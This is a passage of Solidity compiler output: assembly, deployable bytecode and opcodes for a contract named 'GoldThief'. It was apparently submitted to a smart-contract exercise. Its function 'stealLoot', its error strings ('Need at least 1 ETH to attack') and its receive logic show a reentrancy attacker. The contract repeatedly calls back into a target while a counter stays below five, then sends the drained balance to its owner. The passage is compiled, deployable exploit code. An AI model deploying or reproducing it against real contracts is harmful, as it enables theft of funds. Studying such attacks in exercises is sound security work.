tag_87:\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1479:1615  function stealLoot() external {... */\n      jump\t// out\n        /* \"#utility.yul\":7:187   */\n    tag_88:\n        /* \"#utility.yul\":55:132   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":52:53   */\n      0x00\n        /* \"#utility.yul\":45:133   */\n      mstore\n        /* \"#utility.yul\":152:156   */\n      0x11\n        /* \"#utility.yul\":149:150   */\n      0x04\n        /* \"#utility.yul\":142:157   */\n      mstore\n        /* \"#utility.yul\":176:180   */\n      0x24\n        /* \"#utility.yul\":173:174   */\n      0x00\n        /* \"#utility.yul\":166:181   */\n      revert\n        /* \"#utility.yul\":193:270   */\n    tag_89:\n        /* \"#utility.yul\":230:237   */\n      0x00\n        /* \"#utility.yul\":259:264   */\n      dup2\n        /* \"#utility.yul\":248:264   */\n      swap1\n      pop\n        /* \"#utility.yul\":193:270   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":276:509   */\n    tag_15:\n        /* \"#utility.yul\":315:318   */\n      0x00\n        /* \"#utility.yul\":338:362   */\n      tag_112\n        /* \"#utility.yul\":356:361   */\n      dup3\n        /* \"#utility.yul\":338:362   */\n      tag_89\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":329:362   */\n      swap2\n      pop\n        /* \"#utility.yul\":384:450   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":377:382   */\n      dup3\n        /* \"#utility.yul\":374:451   */\n      sub\n        /* \"#utility.yul\":371:474   */\n      tag_113\n      jumpi\n        /* \"#utility.yul\":454:472   */\n      tag_114\n      tag_88\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":371:474   */\n    tag_113:\n        /* \"#utility.yul\":501:502   */\n      0x01\n        /* \"#utility.yul\":494:499   */\n      dup3\n        /* \"#utility.yul\":490:503   */\n      add\n        /* \"#utility.yul\":483:503   */\n      swap1\n      pop\n        /* \"#utility.yul\":276:509   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":515:633   */\n    tag_90:\n        /* \"#utility.yul\":602:626   */\n      tag_116\n        /* \"#utility.yul\":620:625   */\n      dup2\n        /* \"#utility.yul\":602:626   */\n      tag_89\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":597:600   */\n      dup3\n        /* \"#utility.yul\":590:627   */\n      mstore\n        /* \"#utility.yul\":515:633   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":639:861   */\n    tag_30:\n        /* \"#utility.yul\":732:736   */\n      0x00\n        /* \"#utility.yul\":770:772   */\n      0x20\n        /* \"#utility.yul\":759:768   */\n      dup3\n        /* \"#utility.yul\":755:773   */\n      add\n        /* \"#utility.yul\":747:773   */\n      swap1\n      pop\n        /* \"#utility.yul\":783:854   */\n      tag_118\n        /* \"#utility.yul\":851:852   */\n      0x00\n        /* \"#utility.yul\":840:849   */\n      dup4\n        /* \"#utility.yul\":836:853   */\n      add\n        /* \"#utility.yul\":827:833   */\n      dup5\n        /* \"#utility.yul\":783:854   */\n      tag_90\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":639:861   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":867:993   */\n    tag_91:\n        /* \"#utility.yul\":904:911   */\n      0x00\n        /* \"#utility.yul\":944:986   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":937:942   */\n      dup3\n        /* \"#utility.yul\":933:987   */\n      and\n        /* \"#utility.yul\":922:987   */\n      swap1\n      pop\n        /* \"#utility.yul\":867:993   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":999:1059   */\n    tag_92:\n        /* \"#utility.yul\":1027:1030   */\n      0x00\n        /* \"#utility.yul\":1048:1053   */\n      dup2\n        /* \"#utility.yul\":1041:1053   */\n      swap1\n      pop\n        /* \"#utility.yul\":999:1059   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1065:1207   */\n    tag_93:\n        /* \"#utility.yul\":1115:1124   */\n      0x00\n        /* \"#utility.yul\":1148:1201   */\n      tag_122\n        /* \"#utility.yul\":1166:1200   */\n      tag_123\n        /* \"#utility.yul\":1175:1199   */\n      tag_124\n        /* \"#utility.yul\":1193:1198   */\n      dup5\n        /* \"#utility.yul\":1175:1199   */\n      tag_91\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":1166:1200   */\n      tag_92\n      jump\t// in\n    tag_123:\n        /* \"#utility.yul\":1148:1201   */\n      tag_91\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":1135:1201   */\n      swap1\n      pop\n        /* \"#utility.yul\":1065:1207   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1213:1339   */\n    tag_94:\n        /* \"#utility.yul\":1263:1272   */\n      0x00\n        /* \"#utility.yul\":1296:1333   */\n      tag_126\n        /* \"#utility.yul\":1327:1332   */\n      dup3\n        /* \"#utility.yul\":1296:1333   */\n      tag_93\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":1283:1333   */\n      swap1\n      pop\n        /* \"#utility.yul\":1213:1339   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1345:1484   */\n    tag_95:\n        /* \"#utility.yul\":1408:1417   */\n      0x00\n        /* \"#utility.yul\":1441:1478   */\n      tag_128\n        /* \"#utility.yul\":1472:1477   */\n      dup3\n        /* \"#utility.yul\":1441:1478   */\n      tag_94\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":1428:1478   */\n      swap1\n      pop\n        /* \"#utility.yul\":1345:1484   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1490:1647   */\n    tag_96:\n        /* \"#utility.yul\":1590:1640   */\n      tag_130\n        /* \"#utility.yul\":1634:1639   */\n      dup2\n        /* \"#utility.yul\":1590:1640   */\n      tag_95\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":1585:1588   */\n      dup3\n        /* \"#utility.yul\":1578:1641   */\n      mstore\n        /* \"#utility.yul\":1490:1647   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1653:1901   */\n    tag_35:\n        /* \"#utility.yul\":1759:1763   */\n      0x00\n        /* \"#utility.yul\":1797:1799   */\n      0x20\n        /* \"#utility.yul\":1786:1795   */\n      dup3\n        /* \"#utility.yul\":1782:1800   */\n      add\n        /* \"#utility.yul\":1774:1800   */\n      swap1\n      pop\n        /* \"#utility.yul\":1810:1894   */\n      tag_132\n        /* \"#utility.yul\":1891:1892   */\n      0x00\n        /* \"#utility.yul\":1880:1889   */\n      dup4\n        /* \"#utility.yul\":1876:1893   */\n      add\n        /* \"#utility.yul\":1867:1873   */\n      dup5\n        /* \"#utility.yul\":1810:1894   */\n      tag_96\n      jump\t// in\n    tag_132:\n        /* \"#utility.yul\":1653:1901   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1907:1997   */\n    tag_97:\n        /* \"#utility.yul\":1941:1948   */\n      0x00\n        /* \"#utility.yul\":1984:1989   */\n      dup2\n        /* \"#utility.yul\":1977:1990   */\n      iszero\n        /* \"#utility.yul\":1970:1991   */\n      iszero\n        /* \"#utility.yul\":1959:1991   */\n      swap1\n      pop\n        /* \"#utility.yul\":1907:1997   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2003:2112   */\n    tag_98:\n        /* \"#utility.yul\":2084:2105   */\n      tag_135\n        /* \"#utility.yul\":2099:2104   */\n      dup2\n        /* \"#utility.yul\":2084:2105   */\n      tag_97\n      jump\t// in\n    tag_135:\n        /* \"#utility.yul\":2079:2082   */\n      dup3\n        /* \"#utility.yul\":2072:2106   */\n      mstore\n        /* \"#utility.yul\":2003:2112   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2118:2328   */\n    tag_48:\n        /* \"#utility.yul\":2205:2209   */\n      0x00\n        /* \"#utility.yul\":2243:2245   */\n      0x20\n        /* \"#utility.yul\":2232:2241   */\n      dup3\n        /* \"#utility.yul\":2228:2246   */\n      add\n        /* \"#utility.yul\":2220:2246   */\n      swap1\n      pop\n        /* \"#utility.yul\":2256:2321   */\n      tag_137\n        /* \"#utility.yul\":2318:2319   */\n      0x00\n        /* \"#utility.yul\":2307:2316   */\n      dup4\n        /* \"#utility.yul\":2303:2320   */\n      add\n        /* \"#utility.yul\":2294:2300   */\n      dup5\n        /* \"#utility.yul\":2256:2321   */\n      tag_98\n      jump\t// in\n    tag_137:\n        /* \"#utility.yul\":2118:2328   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2334:2430   */\n    tag_99:\n        /* \"#utility.yul\":2371:2378   */\n      0x00\n        /* \"#utility.yul\":2400:2424   */\n      tag_139\n        /* \"#utility.yul\":2418:2423   */\n      dup3\n        /* \"#utility.yul\":2400:2424   */\n      tag_91\n      jump\t// in\n    tag_139:\n        /* \"#utility.yul\":2389:2424   */\n      swap1\n      pop\n        /* \"#utility.yul\":2334:2430   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2436:2554   */\n    tag_100:\n        /* \"#utility.yul\":2523:2547   */\n      tag_141\n        /* \"#utility.yul\":2541:2546   */\n      dup2\n        /* \"#utility.yul\":2523:2547   */\n      tag_99\n      jump\t// in\n    tag_141:\n        /* \"#utility.yul\":2518:2521   */\n      dup3\n        /* \"#utility.yul\":2511:2548   */\n      mstore\n        /* \"#utility.yul\":2436:2554   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2560:2782   */\n    tag_53:\n        /* \"#utility.yul\":2653:2657   */\n      0x00\n        /* \"#utility.yul\":2691:2693   */\n      0x20\n        /* \"#utility.yul\":2680:2689   */\n      dup3\n        /* \"#utility.yul\":2676:2694   */\n      add\n        /* \"#utility.yul\":2668:2694   */\n      swap1\n      pop\n        /* \"#utility.yul\":2704:2775   */\n      tag_143\n        /* \"#utility.yul\":2772:2773   */\n      0x00\n        /* \"#utility.yul\":2761:2770   */\n      dup4\n        /* \"#utility.yul\":2757:2774   */\n      add\n        /* \"#utility.yul\":2748:2754   */\n      dup5\n        /* \"#utility.yul\":2704:2775   */\n      tag_100\n      jump\t// in\n    tag_143:\n        /* \"#utility.yul\":2560:2782   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2788:2957   */\n    tag_101:\n        /* \"#utility.yul\":2872:2883   */\n      0x00\n        /* \"#utility.yul\":2906:2912   */\n      dup3\n        /* \"#utility.yul\":2901:2904   */\n      dup3\n        /* \"#utility.yul\":2894:2913   */\n      mstore\n        /* \"#utility.yul\":2946:2950   */\n      0x20\n        /* \"#utility.yul\":2941:2944   */\n      dup3\n        /* \"#utility.yul\":2937:2951   */\n      add\n        /* \"#utility.yul\":2922:2951   */\n      swap1\n      pop\n        /* \"#utility.yul\":2788:2957   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2963:3123   */\n    tag_102:\n        /* \"#utility.yul\":3103:3115   */\n      0x4f6e6c79206f776e657200000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3099:3100   */\n      0x00\n        /* \"#utility.yul\":3091:3097   */\n      dup3\n        /* \"#utility.yul\":3087:3101   */\n      add\n        /* \"#utility.yul\":3080:3116   */\n      mstore\n        /* \"#utility.yul\":2963:3123   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3129:3495   */\n    tag_103:\n        /* \"#utility.yul\":3271:3274   */\n      0x00\n        /* \"#utility.yul\":3292:3359   */\n      tag_147\n        /* \"#utility.yul\":3356:3358   */\n      0x0a\n        /* \"#utility.yul\":3351:3354   */\n      dup4\n        /* \"#utility.yul\":3292:3359   */\n      tag_101\n      jump\t// in\n    tag_147:\n        /* \"#utility.yul\":3285:3359   */\n      swap2\n      pop\n        /* \"#utility.yul\":3368:3461   */\n      tag_148\n        /* \"#utility.yul\":3457:3460   */\n      dup3\n        /* \"#utility.yul\":3368:3461   */\n      tag_102\n      jump\t// in\n    tag_148:\n        /* \"#utility.yul\":3486:3488   */\n      0x20\n        /* \"#utility.yul\":3481:3484   */\n      dup3\n        /* \"#utility.yul\":3477:3489   */\n      add\n        /* \"#utility.yul\":3470:3489   */\n      swap1\n      pop\n        /* \"#utility.yul\":3129:3495   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3501:3920   */\n    tag_61:\n        /* \"#utility.yul\":3667:3671   */\n      0x00\n        /* \"#utility.yul\":3705:3707   */\n      0x20\n        /* \"#utility.yul\":3694:3703   */\n      dup3\n        /* \"#utility.yul\":3690:3708   */\n      add\n        /* \"#utility.yul\":3682:3708   */\n      swap1\n      pop\n        /* \"#utility.yul\":3754:3763   */\n      dup2\n        /* \"#utility.yul\":3748:3752   */\n      dup2\n        /* \"#utility.yul\":3744:3764   */\n      sub\n        /* \"#utility.yul\":3740:3741   */\n      0x00\n        /* \"#utility.yul\":3729:3738   */\n      dup4\n        /* \"#utility.yul\":3725:3742   */\n      add\n        /* \"#utility.yul\":3718:3765   */\n      mstore\n        /* \"#utility.yul\":3782:3913   */\n      tag_150\n        /* \"#utility.yul\":3908:3912   */\n      dup2\n        /* \"#utility.yul\":3782:3913   */\n      tag_103\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":3774:3913   */\n      swap1\n      pop\n        /* \"#utility.yul\":3501:3920   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3926:4095   */\n    tag_104:\n        /* \"#utility.yul\":4066:4087   */\n      0x4e656564206174206c6561737420312045544800000000000000000000000000\n        /* \"#utility.yul\":4062:4063   */\n      0x00\n        /* \"#utility.yul\":4054:4060   */\n      dup3\n        /* \"#utility.yul\":4050:4064   */\n      add\n        /* \"#utility.yul\":4043:4088   */\n      mstore\n        /* \"#utility.yul\":3926:4095   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4101:4467   */\n    tag_105:\n        /* \"#utility.yul\":4243:4246   */\n      0x00\n        /* \"#utility.yul\":4264:4331   */\n      tag_153\n        /* \"#utility.yul\":4328:4330   */\n      0x13\n        /* \"#utility.yul\":4323:4326   */\n      dup4\n        /* \"#utility.yul\":4264:4331   */\n      tag_101\n      jump\t// in\n    tag_153:\n        /* \"#utility.yul\":4257:4331   */\n      swap2\n      pop\n        /* \"#utility.yul\":4340:4433   */\n      tag_154\n        /* \"#utility.yul\":4429:4432   */\n      dup3\n        /* \"#utility.yul\":4340:4433   */\n      tag_104\n      jump\t// in\n    tag_154:\n        /* \"#utility.yul\":4458:4460   */\n      0x20\n        /* \"#utility.yul\":4453:4456   */\n      dup3\n        /* \"#utility.yul\":4449:4461   */\n      add\n        /* \"#utility.yul\":4442:4461   */\n      swap1\n      pop\n        /* \"#utility.yul\":4101:4467   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4473:4892   */\n    tag_64:\n        /* \"#utility.yul\":4639:4643   */\n      0x00\n        /* \"#utility.yul\":4677:4679   */\n      0x20\n        /* \"#utility.yul\":4666:4675   */\n      dup3\n        /* \"#utility.yul\":4662:4680   */\n      add\n        /* \"#utility.yul\":4654:4680   */\n      swap1\n      pop\n        /* \"#utility.yul\":4726:4735   */\n      dup2\n        /* \"#utility.yul\":4720:4724   */\n      dup2\n        /* \"#utility.yul\":4716:4736   */\n      sub\n        /* \"#utility.yul\":4712:4713   */\n      0x00\n        /* \"#utility.yul\":4701:4710   */\n      dup4\n        /* \"#utility.yul\":4697:4714   */\n      add\n        /* \"#utility.yul\":4690:4737   */\n      mstore\n        /* \"#utility.yul\":4754:4885   */\n      tag_156\n        /* \"#utility.yul\":4880:4884   */\n      dup2\n        /* \"#utility.yul\":4754:4885   */\n      tag_105\n      jump\t// in\n    tag_156:\n        /* \"#utility.yul\":4746:4885   */\n      swap1\n      pop\n        /* \"#utility.yul\":4473:4892   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4898:5077   */\n    tag_106:\n        /* \"#utility.yul\":5038:5069   */\n      0x4e656564206174206c6561737420312045544820746f2061747461636b000000\n        /* \"#utility.yul\":5034:5035   */\n      0x00\n        /* \"#utility.yul\":5026:5032   */\n      dup3\n        /* \"#utility.yul\":5022:5036   */\n      add\n        /* \"#utility.yul\":5015:5070   */\n      mstore\n        /* \"#utility.yul\":4898:5077   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5083:5449   */\n    tag_107:\n        /* \"#utility.yul\":5225:5228   */\n      0x00\n        /* \"#utility.yul\":5246:5313   */\n      tag_159\n        /* \"#utility.yul\":5310:5312   */\n      0x1d\n        /* \"#utility.yul\":5305:5308   */\n      dup4\n        /* \"#utility.yul\":5246:5313   */\n      tag_101\n      jump\t// in\n    tag_159:\n        /* \"#utility.yul\":5239:5313   */\n      swap2\n      pop\n        /* \"#utility.yul\":5322:5415   */\n      tag_160\n        /* \"#utility.yul\":5411:5414   */\n      dup3\n        /* \"#utility.yul\":5322:5415   */\n      tag_106\n      jump\t// in\n    tag_160:\n        /* \"#utility.yul\":5440:5442   */\n      0x20\n        /* \"#utility.yul\":5435:5438   */\n      dup3\n        /* \"#utility.yul\":5431:5443   */\n      add\n        /* \"#utility.yul\":5424:5443   */\n      swap1\n      pop\n        /* \"#utility.yul\":5083:5449   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5455:5874   */\n    tag_76:\n        /* \"#utility.yul\":5621:5625   */\n      0x00\n        /* \"#utility.yul\":5659:5661   */\n      0x20\n        /* \"#utility.yul\":5648:5657   */\n      dup3\n        /* \"#utility.yul\":5644:5662   */\n      add\n        /* \"#utility.yul\":5636:5662   */\n      swap1\n      pop\n        /* \"#utility.yul\":5708:5717   */\n      dup2\n        /* \"#utility.yul\":5702:5706   */\n      dup2\n        /* \"#utility.yul\":5698:5718   */\n      sub\n        /* \"#utility.yul\":5694:5695   */\n      0x00\n        /* \"#utility.yul\":5683:5692   */\n      dup4\n        /* \"#utility.yul\":5679:5696   */\n      add\n        /* \"#utility.yul\":5672:5719   */\n      mstore\n        /* \"#utility.yul\":5736:5867   */\n      tag_162\n        /* \"#utility.yul\":5862:5866   */\n      dup2\n        /* \"#utility.yul\":5736:5867   */\n      tag_107\n      jump\t// in\n    tag_162:\n        /* \"#utility.yul\":5728:5867   */\n      swap1\n      pop\n        /* \"#utility.yul\":5455:5874   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212207f3dbeadfab9c3e7314ce7d397e314b457a476d296768e6a30651d8fc7798bc964736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b50604051610ccb380380610ccb83398181016040528101906100319190610114565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013f565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b6100f3816100d9565b81146100fd575f5ffd5b50565b5f8151905061010e816100ea565b92915050565b5f60208284031215610129576101286100b6565b5b5f61013684828501610100565b91505092915050565b610b7f8061014c5f395ff3fe60806040526004361061007e575f3560e01c806367a3fde81161004d57806367a3fde8146102a257806371cb791a146102ac5780638da5cb5b146102d6578063cff53a4a1461030057610216565b806312065fe01461021a5780631f92db4514610244578063407c28211461026e578063494eba641461029857610216565b366102165760025f81548092919061009590610893565b919050555060035f9054906101000a900460ff161580156100f55750670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110155b801561010357506005600254105b15610184575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663710957cc6040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561016d575f5ffd5b505af115801561017f573d5f5f3e3d5ffd5b505050505b60035f9054906101000a900460ff1615610214575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16637fd426176040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101fd575f5ffd5b505af115801561020f573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b348015610225575f5ffd5b5061022e610316565b60405161023b91906108e9565b60405180910390f35b34801561024f575f5ffd5b5061025861031d565b604051610265919061097c565b60405180910390f35b348015610279575f5ffd5b50610282610341565b60405161028f91906108e9565b60405180910390f35b6102a0610347565b005b6102aa61053c565b005b3480156102b7575f5ffd5b506102c0610730565b6040516102cd91906109af565b60405180910390f35b3480156102e1575f5ffd5b506102ea610742565b6040516102f791906109e8565b60405180910390f35b34801561030b575f5ffd5b50610314610767565b005b5f47905090565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103d6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103cd90610a5b565b60405180910390fd5b670de0b6b3a7640000341015610421576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161041890610ac3565b60405180910390fd5b600160035f6101000a81548160ff0219169083151502179055505f6002819055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156104a8575f5ffd5b505af11580156104ba573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16637fd426176040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610524575f5ffd5b505af1158015610536573d5f5f3e3d5ffd5b50505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146105cb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105c290610a5b565b60405180910390fd5b670de0b6b3a7640000341015610616576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161060d90610b2b565b60405180910390fd5b5f60035f6101000a81548160ff0219169083151502179055505f6002819055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b15801561069c575f5ffd5b505af11580156106ae573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663710957cc6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610718575f5ffd5b505af115801561072a573d5f5f3e3d5ffd5b50505050565b60035f9054906101000a900460ff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146107f6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107ed90610a5b565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561085a573d5f5f3e3d5ffd5b50565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f61089d8261088a565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036108cf576108ce61085d565b5b600182019050919050565b6108e38161088a565b82525050565b5f6020820190506108fc5f8301846108da565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61094461093f61093a84610902565b610921565b610902565b9050919050565b5f6109558261092a565b9050919050565b5f6109668261094b565b9050919050565b6109768161095c565b82525050565b5f60208201905061098f5f83018461096d565b92915050565b5f8115159050919050565b6109a981610995565b82525050565b5f6020820190506109c25f8301846109a0565b92915050565b5f6109d282610902565b9050919050565b6109e2816109c8565b82525050565b5f6020820190506109fb5f8301846109d9565b92915050565b5f82825260208201905092915050565b7f4f6e6c79206f776e6572000000000000000000000000000000000000000000005f82015250565b5f610a45600a83610a01565b9150610a5082610a11565b602082019050919050565b5f6020820190508181035f830152610a7281610a39565b9050919050565b7f4e656564206174206c65617374203120455448000000000000000000000000005f82015250565b5f610aad601383610a01565b9150610ab882610a79565b602082019050919050565b5f6020820190508181035f830152610ada81610aa1565b9050919050565b7f4e656564206174206c6561737420312045544820746f2061747461636b0000005f82015250565b5f610b15601d83610a01565b9150610b2082610ae1565b602082019050919050565b5f6020820190508181035f830152610b4281610b09565b905091905056fea26469706673582212207f3dbeadfab9c3e7314ce7d397e314b457a476d296768e6a30651d8fc7798bc964736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xCCB CODESIZE SUB DUP1 PUSH2 0xCCB DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x114 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x13F JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE3 DUP3 PUSH2 0xBA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF3 DUP2 PUSH2 0xD9 JUMP JUMPDEST DUP2 EQ PUSH2 0xFD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x10E DUP2 PUSH2 0xEA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x129 JUMPI PUSH2 0x128 PUSH2 0xB6 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x136 DUP5 DUP3 DUP6 ADD PUSH2 0x100 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xB7F DUP1 PUSH2 0x14C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x7E JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x67A3FDE8 GT PUSH2 0x4D JUMPI DUP1 PUSH4 0x67A3FDE8 EQ PUSH2 0x2A2 JUMPI DUP1 PUSH4 0x71CB791A EQ PUSH2 0x2AC JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x2D6 JUMPI DUP1 PUSH4 0xCFF53A4A EQ PUSH2 0x300 JUMPI PUSH2 0x216 JUMP JUMPDEST DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x21A JUMPI DUP1 PUSH4 0x1F92DB45 EQ PUSH2 0x244 JUMPI DUP1 PUSH4 0x407C2821 EQ PUSH2 0x26E JUMPI DUP1 PUSH4 0x494EBA64 EQ PUSH2 0x298 JUMPI PUSH2 0x216 JUMP JUMPDEST CALLDATASIZE PUSH2 0x216 JUMPI PUSH1 0x2 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x95 SWAP1 PUSH2 0x893 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x3 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO DUP1 ISZERO PUSH2 0xF5 JUMPI POP PUSH8 0xDE0B6B3A7640000 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x103 JUMPI POP PUSH1 0x5 PUSH1 0x2 SLOAD LT JUMPDEST ISZERO PUSH2 0x184 JUMPI PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND 